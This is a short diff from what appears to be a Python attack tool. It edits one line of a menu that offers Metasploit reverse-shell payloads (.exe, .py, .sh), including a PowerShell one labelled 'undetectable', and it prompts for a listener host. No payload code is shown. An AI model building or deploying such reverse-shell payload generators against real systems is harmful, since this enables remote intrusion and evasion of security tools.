@@ -67,7 +67,7 @@ def optiona4():
 		print("1 -- windows/meterpreter/reverse_tcp (PAYLOAD REVERSE SHELL .EXE)")
 		print("2 -- cmd/unix/reverse_python (PAYLOAD REVERSE SHELL .PY)")
 		print("3 -- cmd/unix/reverse_bash (PAYLOAD REVERSE SHELL .SH)")
-		print("4 -- msfvenom -p windows/powershell_reverse_tcp (UNDETECTABLE PAYLOAD REVERSE SHELL .EXE)")
+		print("4 -- windows/powershell_reverse_tcp (UNDETECTABLE PAYLOAD REVERSE SHELL .EXE)")
 		choosemsf = input("Choose one option: ")
 		hostmsf = raw_input("Select the local host (%s) : "%address)
 		s.close()
